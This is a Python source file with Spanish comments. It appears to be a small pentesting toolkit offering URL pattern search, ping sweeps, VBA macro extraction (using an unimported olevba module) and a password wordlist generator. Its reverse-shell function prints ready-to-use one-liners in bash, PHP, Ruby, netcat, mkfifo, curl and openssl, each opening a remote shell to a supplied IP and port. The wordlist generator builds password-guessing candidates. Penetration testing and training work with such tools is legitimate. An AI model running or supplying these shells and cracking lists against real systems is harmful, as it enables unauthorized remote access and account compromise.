import requests
import re
from pwn import log as o
import socket
import subprocess as sub
from typing import Tuple
from termcolor import colored
import random
import string
from itertools import permutations
import itertools

# Función para buscar un patrón en el contenido de una URL
def fetch_and_search(url: str, search_pattern: str) -> str:
    matches = []
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        for line in response.text.splitlines():
            if re.search(search_pattern, line):
                matches.append(line.strip())
        return matches
    except requests.RequestException as e:
        print(f"[!] Error al conectar con {url}: {e}")
    except Exception as e:
        print(f"[!] Error inesperado: {e}")

# Función para descubrir hosts mediante ICMP (ping)
def scan_icmp(ip: str) -> str:
    try:
        result = sub.run(
            ["ping", "-c", "1", "-W", "1", ip],
            timeout=2,
            stdout=sub.DEVNULL,
            stderr=sub.DEVNULL
        )
        return f"La IP {ip} está activa" if result.returncode == 0 else f"La IP {ip} no está activa"
    except sub.TimeoutExpired:
        return f"[!] Tiempo de espera agotado al hacer ping a {ip}"
    except Exception as e:
        pass

# Función para extraer las macros de un archivo docm
def analyze_macros(file_path: str) -> str:
    try:
        vbaparser = olevba.VBA_Parser(file_path)
        if vbaparser.detect_vba_macros():
            macros = []
            for (filename, stream_path, vba_filename, vba_code) in vbaparser.extract_macros():
                macros.append(f"Macro encontrada en {filename}:\n{vba_code}")
            vbaparser.close()
            return "\n".join(macros)
        else:
            return "No se encontraron macros en el archivo"
    except Exception as e: pass

# Funcion para generar revershells
def generate_reverse_shell_examples(ip: str, port: str) -> str:
    shells = {
        "Bash     :  ": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "PHP      :  ": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "Ruby     :  ": f"ruby -r socket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "Netcat   :  ": f"nc -e /bin/sh {ip} {port}",
        "mkfifo   :  ": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/",
        "sh       :  ": f"sh -i >& /dev/tcp/{ip}/{port} 0>&1",
        "curl     :  ": f"C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null",
        "openssl  :  ": f"mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s"
    }

    result = "\n".join([f"{colored(shell_name, 'cyan')}{command}" for shell_name, command in shells.items()])
    return result

def generate_wordlist(base_word, output_file="dictionary.txt"):
    try:
        variations = set()
        common_symbols = ['!', '@', '#', '$', '%', '&']
        common_numbers = [str(i) for i in range(10)]

        # Alternar mayúsculas y minúsculas (todas las combinaciones posibles)
        alternating_cases = set(
            ''.join(p) for p in itertools.product(*zip(base_word.upper(), base_word.lower()))
        )

        for word in alternating_cases:
            # Agregar números
            for number in common_numbers:
                variations.add(f"{word}{number}")
                variations.add(f"{number}{word}")

            # Agregar símbolos
            for symbol in common_symbols:
                variations.add(f"{word}{symbol}")
                variations.add(f"{symbol}{word}")
            
            # Agregar combinaciones de símbolos y números
            for symbol in common_symbols:
                for number in common_numbers:
                    variations.add(f"{word}{symbol}{number}")
                    variations.add(f"{symbol}{word}{number}")
                    variations.add(f"{symbol}{number}{word}")
                    variations.add(f"{word}{number}{symbol}")

        # Guardar en un archivo
        with open(output_file, 'w') as f:
            for variation in sorted(variations):
                f.write(variation + '\n')
        
        return f"Wordlist generada y guardada en '{output_file}' con {len(variations)} palabras."

    except Exception as e: pass
